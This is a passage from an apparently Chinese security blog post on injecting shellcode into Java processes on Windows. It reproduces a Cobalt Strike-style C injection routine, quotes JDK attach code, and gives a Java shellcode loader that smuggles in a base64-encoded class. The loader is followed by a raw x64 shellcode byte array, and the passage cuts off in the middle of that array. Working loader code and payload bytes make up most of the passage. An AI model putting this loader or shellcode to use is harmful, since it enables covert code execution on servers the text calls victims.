class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//执行注入shellcode的代码</span></span><br><span class="line"><span class="hljs-comment">/* inject some shellcode... enclosed stuff is the shellcode y0 */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">inject</span><span class="hljs-params">(LPCVOID buffer, <span class="hljs-keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    HANDLE hProcess   = <span class="hljs-literal">NULL</span>;</span><br><span class="line">    SIZE_T wrote;</span><br><span class="line">    LPVOID ptr;</span><br><span class="line">    <span class="hljs-keyword">char</span> lbuffer[<span class="hljs-number">1024</span>];</span><br><span class="line">    <span class="hljs-keyword">char</span> cmdbuff[<span class="hljs-number">1024</span>];</span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* reset some stuff */</span></span><br><span class="line">    ZeroMemory( &amp;si, <span class="hljs-keyword">sizeof</span>(si) );</span><br><span class="line">    si.cb = <span class="hljs-keyword">sizeof</span>(si);</span><br><span class="line">    ZeroMemory( &amp;pi, <span class="hljs-keyword">sizeof</span>(pi) );</span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* start a process */</span></span><br><span class="line">    GetStartupInfo(&amp;si);</span><br><span class="line">    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = SW_HIDE;</span><br><span class="line">    si.hStdOutput = <span class="hljs-literal">NULL</span>;</span><br><span class="line">    si.hStdError = <span class="hljs-literal">NULL</span>;</span><br><span class="line">    si.hStdInput = <span class="hljs-literal">NULL</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* resolve windir? */</span></span><br><span class="line">    GetEnvironmentVariableA(<span class="hljs-string">"windir"</span>, lbuffer, <span class="hljs-number">1024</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* setup our path... choose wisely for 32bit and 64bit platforms */</span></span><br><span class="line">    <span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IS64_</span></span><br><span class="line">        _snprintf(cmdbuff, <span class="hljs-number">1024</span>, <span class="hljs-string">"%s\\SysWOW64\\notepad.exe"</span>, lbuffer);</span><br><span class="line">    <span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span></span><br><span class="line">        _snprintf(cmdbuff, <span class="hljs-number">1024</span>, <span class="hljs-string">"%s\\System32\\notepad.exe"</span>, lbuffer);</span><br><span class="line">    <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* spawn the process, baby! */</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (!CreateProcessA(<span class="hljs-literal">NULL</span>, cmdbuff, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, TRUE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">        <span class="hljs-keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">    hProcess = pi.hProcess;</span><br><span class="line">    <span class="hljs-keyword">if</span>( !hProcess )</span><br><span class="line">        <span class="hljs-keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* allocate memory in our process */</span></span><br><span class="line">    ptr = (LPVOID)VirtualAllocEx(hProcess, <span class="hljs-number">0</span>, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* write our shellcode to the process */</span></span><br><span class="line">    WriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T *)&amp;wrote);</span><br><span class="line">    <span class="hljs-keyword">if</span> (wrote != length)</span><br><span class="line">        <span class="hljs-keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment">/* create a thread in the process */</span></span><br><span class="line">    CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ptr, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方法需要自行编写个链接库，并上传到受害服务器上，利用起来并不显得优雅。</p><p>还有另一种方法是利用JNA第三方库，可以直接调用内核的函数，实现Shellcode注入。在<a href="https://yzddmr6.com/" target="_blank" rel="noopener">@yzddmr6</a>师傅的<a href="https://github.com/yzddmr6/Java-Shellcode-Loader" target="_blank" rel="noopener">Java-Shellcode-Loader</a>项目中有实现，但JNA本质上还是基于JNI，使用时还是要加载JNA自己的链接库，并且JDK中默认不包含JNA这个类库，使用时需要想办法引入。</p><h2 id="基于JDK自带的Native方法"><a href="#基于JDK自带的Native方法" class="headerlink" title="基于JDK自带的Native方法"></a>基于JDK自带的Native方法</h2><p>第一个介绍的可能是冰蝎的作者@<a href="https://github.com/rebeyond" target="_blank" rel="noopener">rebeyond</a>师傅首先发现的方法，一种基于JDK自带的Native方法的shellcode注入，严格来说是基于HotSpot虚拟机的JDK的自带Native方法。它是<code>sun/tools/attach/VirtualMachineImpl#enqueue</code>Native方法，存在于用于attach Java进程的<code>tools.jar</code>包中。</p><p>当运行在Windows上时，相应的<code>enqueue</code> Native方法实现在<a href="https://github.com/openjdk/jdk/blob/9623d5bb46d14018a2b777fb7ffed6c66d912c84/src/jdk.attach/windows/native/libattach/VirtualMachineImpl.c" target="_blank" rel="noopener">/src/jdk.attach/windows/native/libattach/VirtualMachineImpl.c</a>中，其中<strong>Create thread in target process to execute code</strong>的操作，不能说跟前面Cobalt Strike注入shellcode的操作毫不相干，只能说是一模一样。</p><figure class="highlight c++ hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">JNIEXPORT <span class="hljs-keyword">void</span> JNICALL Java_sun_tools_attach_VirtualMachineImpl_enqueue</span><br><span class="line">  (JNIEnv *env, jclass cls, jlong handle, jbyteArray stub, jstring cmd,</span><br><span class="line">   jstring pipename, jobjectArray args)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">     * Allocate memory in target process for data and code stub</span></span><br><span class="line"><span class="hljs-comment">     * (assumed aligned and matches architecture of target process)</span></span><br><span class="line"><span class="hljs-comment">     */</span></span><br><span class="line">    hProcess = (HANDLE)handle;</span><br><span class="line"></span><br><span class="line">    pData = (DataBlock*) VirtualAllocEx( hProcess, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(DataBlock), MEM_COMMIT, PAGE_READWRITE );</span><br><span class="line">    <span class="hljs-keyword">if</span> (pData == <span class="hljs-literal">NULL</span>) &#123;</span><br><span class="line">        JNU_ThrowIOExceptionWithLastError(env, <span class="hljs-string">"VirtualAllocEx failed"</span>);</span><br><span class="line">        <span class="hljs-keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    WriteProcessMemory( hProcess, (LPVOID)pData, (LPCVOID)&amp;data, (SIZE_T)<span class="hljs-keyword">sizeof</span>(DataBlock), <span class="hljs-literal">NULL</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    stubLen = (DWORD)(*env)-&gt;GetArrayLength(env, stub);</span><br><span class="line">    stubCode = (*env)-&gt;GetByteArrayElements(env, stub, &amp;isCopy);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> ((*env)-&gt;ExceptionOccurred(env)) <span class="hljs-keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    pCode = (PDWORD) VirtualAllocEx( hProcess, <span class="hljs-number">0</span>, stubLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE );</span><br><span class="line">    <span class="hljs-keyword">if</span> (pCode == <span class="hljs-literal">NULL</span>) &#123;</span><br><span class="line">        JNU_ThrowIOExceptionWithLastError(env, <span class="hljs-string">"VirtualAllocEx failed"</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pData, <span class="hljs-number">0</span>, MEM_RELEASE);</span><br><span class="line">        (*env)-&gt;ReleaseByteArrayElements(env, stub, stubCode, JNI_ABORT);</span><br><span class="line">        <span class="hljs-keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    WriteProcessMemory( hProcess, (LPVOID)pCode, (LPCVOID)stubCode, (SIZE_T)stubLen, <span class="hljs-literal">NULL</span> );</span><br><span class="line">    (*env)-&gt;ReleaseByteArrayElements(env, stub, stubCode, JNI_ABORT);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">     * Create thread in target process to execute code</span></span><br><span class="line"><span class="hljs-comment">     */</span></span><br><span class="line">    hThread = CreateRemoteThread( hProcess,</span><br><span class="line">                                  <span class="hljs-literal">NULL</span>,</span><br><span class="line">                                  <span class="hljs-number">0</span>,</span><br><span class="line">                                  (LPTHREAD_START_ROUTINE) pCode,</span><br><span class="line">                                  pData,</span><br><span class="line">                                  <span class="hljs-number">0</span>,</span><br><span class="line">                                  <span class="hljs-literal">NULL</span> );</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然你不能说这个是bug，只能说是feature。</p><p><img src="/2022/03/22/JVM_Shellcode注入探索/61wBNHEt0OL.jpg" alt></p><p>相应的Demo是比较简单，在<code>stub</code>参数中传入shellcode即可，@<a href="https://github.com/rebeyond" target="_blank" rel="noopener">rebeyond</a>师傅已经给出了代码，笔者在这里做了点简化。不过实现Native方法的链接库<code>attach.dll</code>默认存在，但<code>tools.jar</code>这个包不一定存在，@<a href="https://github.com/rebeyond" target="_blank" rel="noopener">rebeyond</a>师傅巧妙的利用了双亲委派机制，当JVM中没有加载<code>VirtualMachineImpl</code>类时，就会使用下面base64编码的类替代。当然这种方法仅适用于Windows，因为Linux下<code>enqueue</code>并不是这么实现的。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="hljs-keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WindowsAgentShellcodeLoader</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            String classStr = <span class="hljs-string">"yv66vgAAADQAMgoABwAjCAAkCgAlACYF//////////8IACcHACgKAAsAKQcAKgoACQArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAChMc3VuL3Rvb2xzL2F0dGFjaC9XaW5kb3dzVmlydHVhbE1hY2hpbmU7AQAHZW5xdWV1ZQEAPShKW0JMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KVYBAApFeGNlcHRpb25zBwAtAQALb3BlblByb2Nlc3MBAAQoSSlKAQADcnVuAQAFKFtCKVYBAAR2YXIyAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADYnVmAQACW0IBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEAGldpbmRvd3NWaXJ0dWFsTWFjaGluZS5qYXZhDAAMAA0BAAZhdHRhY2gHAC4MAC8AMAEABHRlc3QBABBqYXZhL2xhbmcvT2JqZWN0DAATABQBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAxAA0BACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQALbG9hZExpYnJhcnkBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA9wcmludFN0YWNrVHJhY2UAIQALAAcAAAAAAAQAAQAMAA0AAQAOAAAAMwABAAEAAAAFKrcAAbEAAAACAA8AAAAKAAIAAAAGAAQABwAQAAAADAABAAAABQARABIAAAGIABMAFAABABUAAAAEAAEAFgEIABcAGAABABUAAAAEAAEAFgAJABkAGgABAA4AAAB6AAYAAgAAAB0SArgAAxQABCoSBhIGA70AB7gACKcACEwrtgAKsQABAAUAFAAXAAkAAwAPAAAAGgAGAAAADgAFABAAFAATABcAEQAYABIAHAAVABAAAAAWAAIAGAAEABsAHAABAAAAHQAdAB4AAAAfAAAABwACVwcAIAQAAQAhAAAAAgAi"</span>;</span><br><span class="line">            Class clazz = <span class="hljs-keyword">new</span> MyClassLoader().get(Base64.getDecoder().decode(classStr));</span><br><span class="line">            <span class="hljs-keyword">byte</span> buf[] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFC</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x83</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE4</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xF0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE8</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x65</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x60</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x18</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x72</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0F</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xB7</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4A</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4A</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC0</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xAC</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x61</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x7C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x02</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x2C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xED</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x42</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x80</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x85</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x74</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x67</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x18</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE3</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x34</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD6</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xAC</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC1</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x38</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xF1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x03</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x24</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x08</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x45</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x39</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD8</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x24</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x66</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x1C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x04</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5E</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5A</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5A</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x83</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xEC</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5A</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span 